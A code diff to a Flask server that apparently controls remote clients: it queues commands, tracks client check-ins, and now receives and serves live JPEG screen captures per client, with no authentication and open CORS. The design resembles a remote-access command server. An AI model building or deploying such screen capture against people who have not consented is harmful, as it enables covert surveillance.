@@ -6,6 +6,7 @@ app = Flask(__name__)
 CORS(app) # Enable CORS for all origins
 client_commands = {}
 connected_clients = {} # New dictionary to store connected clients
+client_streams = {} # New dictionary to store latest screen stream for each client
 
 # Configuration
 CLIENT_OFFLINE_THRESHOLD = 15 # seconds
@@ -89,6 +90,31 @@ def get_clients():
 
     print(f"Returning {len(connected_clients)} connected clients (after offline check).")
     return jsonify(connected_clients)
+
+@app.route('/stream', methods=['POST'])
+def stream():
+    client_id = request.headers.get('Client-ID')
+    if not client_id:
+        return jsonify({"status": "error", "message": "Client-ID header missing"}), 400
+
+    image_data = request.get_data()
+    if not image_data:
+        return jsonify({"status": "error", "message": "No image data received"}), 400
+
+    client_streams[client_id] = image_data
+    return jsonify({"status": "ok"}), 200
+
+@app.route('/get_stream')
+def get_stream():
+    client_id = request.args.get('client_id')
+    if not client_id:
+        return "", 400 # Bad request if client_id is missing
+
+    image_data = client_streams.get(client_id)
+    if image_data:
+        return app.response_class(image_data, mimetype='image/jpeg')
+    else:
+        return "", 204 # No content if no stream available for this client
 
 if __name__ == '__main__':
     app.run(host="0.0.0.0", port=5000)
